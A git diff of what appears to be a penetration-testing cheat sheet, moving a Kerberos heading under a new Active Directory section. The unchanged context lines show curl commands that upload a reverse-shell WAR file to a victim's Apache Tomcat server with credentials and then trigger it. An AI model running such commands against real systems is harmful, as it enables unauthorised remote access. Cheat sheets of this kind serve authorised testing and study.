@@ -116,7 +116,8 @@
 - [Apache Tomcat](#Apache-Tomcat)
   - [Get tomcat-users.xml](#Get-tomcat-users)
   - [Upload war file via command line](#Upload-war-file-via-commandline)
-- [Kerberos](#Kerberos)
+- [Active Directory](#Active-Directory)
+  - [Kerberos](#Kerberos)
 --------------------------------------------------------------------------------------------------------------------------------
 ## Amazon_S3
 
@@ -986,4 +987,6 @@ curl -u '<username>':'<userpassword>' -T reverseshell_file.war 'http://<victim_i
 curl -u '<username>':'<userpassword>' http://<victim_ip>:8080/rev_shell
 ```
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Kerberos
+# Active Directory
+
+## Kerberos
